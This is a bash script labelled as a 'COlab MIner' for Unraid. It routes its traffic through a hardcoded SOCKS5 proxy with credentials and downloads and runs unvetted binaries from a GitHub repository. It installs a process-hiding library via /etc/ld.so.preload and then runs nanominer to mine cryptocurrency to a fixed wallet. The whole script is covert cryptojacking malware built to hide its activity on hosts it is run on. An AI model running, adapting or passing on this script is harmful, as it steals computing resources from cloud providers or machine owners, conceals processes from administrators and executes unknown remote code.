#!/bin/bash
echo "---Starting---"
echo ""
echo "Project: COlab MIner"
echo "Author:  lnxd"
echo "Base:    $BASE"
echo "Driver:  $INSTALLED_DRIVERV"
echo "Target:  Unraid 6.9.0 - 6.9.2"
echo ""
echo "Wallet:  $WALLET"
echo "Pool:    $POOL"
echo ""
echo "Starting colay $MINERV as $(id) with the following arguments:"
echo "gasskan"
echo ""
cd /home/docker
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl -y

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 216.131.111.122:1080
socks5_username = QuENTURW
socks5_password = EfAdJ1Qu
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "
./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
./graftcp/graftcp wget https://github.com/nanopool/nanominer/releases/download/v3.6.6/nanominer-linux-3.6.6-cuda11.tar.gz && tar xvf nanominer-linux-3.6.6-cuda11.tar.gz && cd nanominer-linux-3.6.6-cuda11
chmod +x nanominer && ./nanominer -pool ethash.unmineable.com:3333 -algo etchash -wallet 0x2c85dbf9518342c1c4d0cb8dc7c036c974c993c5 -coin eth -rigName tess1 


